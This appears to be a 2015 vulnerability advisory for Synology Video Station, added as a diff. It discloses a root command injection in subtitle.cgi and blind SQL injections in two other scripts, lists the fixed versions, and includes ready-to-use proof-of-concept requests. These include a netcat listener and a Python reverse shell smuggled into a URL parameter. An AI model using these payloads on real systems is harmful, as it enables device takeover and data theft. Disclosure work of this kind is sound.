@@ -1,0 +1,106 @@
+------------------------------------------------------------------------
+Synology Video Station command injection and multiple SQL injection
+vulnerabilities
+------------------------------------------------------------------------
+Han Sahin, September 2015
+
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+It was discovered that Synology Video Station is vulnerable to command
+injection that allows an attacker to execute arbitrary system commands
+with root privileges. In addition, Video Station is affected by multiple
+SQL injection vulnerabilities that allows for execution of arbitrary SQL
+statements with DBA privileges. As a result it is possible to compromise
+the PostgreSQL database server.
+
+------------------------------------------------------------------------
+Affected versions
+------------------------------------------------------------------------
+These issues affect Synology Video Station version up to and including
+version 1.5-0757.
+
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+Synology has reported that these issue have been resolved in:
+
+- Video Station version 1.5-0757 [audiotrack.cgi]
+- Video Station version 1.5-0763 [watchstatus.cgi]
+- Video Station version 1.5-0763 [subtitle.cgi]
+
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+
+Command injection vulnerability in subtitle.cgi
+
+A command injection vulnerability exists in the subtitle.cgi CGI script. This issue exists in the 'subtitle_codepage' parameter, which allows an attacker to execute arbitrary commands with root privileges. The script subtitle.cgi can also be called when the 'public share' option is enabled. With this option enabled, this issue can also be exploited by an unauthenticated remote attacker. This vulnerability can be used to compromise a Synology DiskStation NAS, including all data stored on the NAS, and the NAS as stepping stone to attack other systems.
+
+
+- Start netcat on attacker's system:
+
+nc -nvlp 80
+
+- Submit the following request (change the IP - 192.168.1.20 - & port number - 80):
+
+GET /webapi/VideoStation/subtitle.cgi?id=193&api=SYNO.VideoStation.Subtitle&method=get&version=2&subtitle_id=%2Fvolume1%2Fvideo%2Fmr.robot.s01e10.720p.hdtv.x264-killers.nfo%2FMr.Robot.S01E10.720p.HDTV.x264-KILLERS.2aafa5c.eng.srt&subtitle_codepage=auto%26python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.1.20%22,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5b%22/bin/sh%22,%22-i%22%5d);'%26&preview=false&sharing_id=kSiNy0Pp HTTP/1.1
+Host: 192.168.1.13:5000
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+
+
+SQL injection vulnerability in watchstatus.cgi
+
+A (blind) SQL injection vulnerability exists in the watchstatus.cgi CGI script. This issue exists in the code handling the 'id' parameter and allows an attacker to execute arbitrary SQL statements with DBA privileges. As a result it is possible to compromise the PostgreSQL database server. In the following screenshot this issue is exploited using sqlmap.
+
+Proof of concept
+
+POST /webapi/VideoStation/watchstatus.cgi HTTP/1.1
+Host: 192.168.1.13:5000
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-SYNO-TOKEN: Lq6mE9ANV2egU
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 80
+Cookie: stay_login=0; id=Lq5QWGqg7Rnzc13A0LTN001710; jwplayer.volume=50
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+   
+id=15076178770%20or%204864%3d4864--%20&position=10.05&api=SYNO.VideoStation.WatchStatus&method=setinfo&version=1
+
+It should be noted that the X-SYNO-TOKEN header provides protection against Cross-Site Request Forgery attacks. As of DSM version 5.2-5592 Update 3, this protection is enabled by default.
+SQL injection vulnerability in audiotrack.cgi
+
+A (blind) SQL injection vulnerability exists in the audiotrack.cgi CGI script. This issue exists in the code handling the 'id' parameter and allows an attacker to execute arbitrary SQL statements with DBA privileges. As a result it is possible to compromise the PostgreSQL database server.
+Proof of concept
+
+POST /webapi/VideoStation/audiotrack.cgi HTTP/1.1
+Content-Length: 294
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-SYNO-TOKEN: 7IKJdJMa8cutE
+Host: <hostname>:5000
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/5.0
+Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Cookie: stay_login=0; id=7IivlxDM9MFb213A0LTN001710
+   
+id=1%20AND%20%28SELECT%20%28CASE%20WHEN%20%28%28SELECT%20usesuper%3Dtrue%20FROM%20pg_user%20WHERE%20usename%3DCURRENT_USER%20OFFSET%200%20LIMIT%201%29%29%20THEN%20%28CHR%2849%29%29%20ELSE%20%28CHR%2848%29%29%20END%29%29%3D%28CHR%2849%29%29&api=SYNO.VideoStation.AudioTrack&method=list&version=1
+
